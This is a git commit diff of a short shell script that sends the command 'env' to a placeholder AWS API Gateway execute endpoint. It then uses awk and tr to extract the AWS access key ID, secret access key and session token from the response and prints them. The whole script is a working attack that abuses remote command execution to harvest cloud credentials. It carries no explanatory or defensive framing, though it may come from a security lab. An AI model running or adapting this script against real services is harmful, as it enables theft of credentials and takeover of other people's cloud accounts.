059a0c39a9de85fe0e4bdbae2fe09764e5f29153
LV6 <63260147+LV6LV@users.noreply.github.com>
2024-03-10 13:35:41 -0500

    Update env special.sh

--- env special.sh
+++ env special.sh
@@ -5,11 +5,17 @@ response=$(curl -s -X POST https://<API GOES HERE>.amazonaws.com/execute \
 -H "Content-Type: application/json" \
 -d '{"command":"env"}')
 
-# Parse and print the AWS credentials from the response
-AWS_ACCESS_ID=$(echo $RESPONSE | jq -r '.AWS_ACCESS_ID')
-AWS_SECRET_ACCESS_KEY=$(echo $RESPONSE | jq -r '.AWS_SECRET_ACCESS_KEY')
-AWS_SESSION_TOKEN=$(echo $RESPONSE | jq -r '.AWS_SESSION_TOKEN')
+# Use awk to extract values
+AWS_SESSION_TOKEN=$(echo "$response" | awk -F'=' '/AWS_SESSION_TOKEN/{print $2}')
+AWS_SECRET_ACCESS_KEY=$(echo "$response" | awk -F'=' '/AWS_SECRET_ACCESS_KEY/{print $2}')
+AWS_ACCESS_KEY_ID=$(echo "$response" | awk -F'=' '/AWS_ACCESS_KEY_ID/{print $2}')
 
-echo "AWS_ACCESS_ID: $AWS_ACCESS_ID"
+# Trim trailing characters if needed
+AWS_SESSION_TOKEN=$(echo $AWS_SESSION_TOKEN | tr -d '"\r\n')
+AWS_SECRET_ACCESS_KEY=$(echo $AWS_SECRET_ACCESS_KEY | tr -d '"\r\n')
+AWS_ACCESS_KEY_ID=$(echo $AWS_ACCESS_KEY_ID | tr -d '"\r\n')
+
+# Print the extracted values
+echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
 echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"
 echo "AWS_SESSION_TOKEN: $AWS_SESSION_TOKEN"
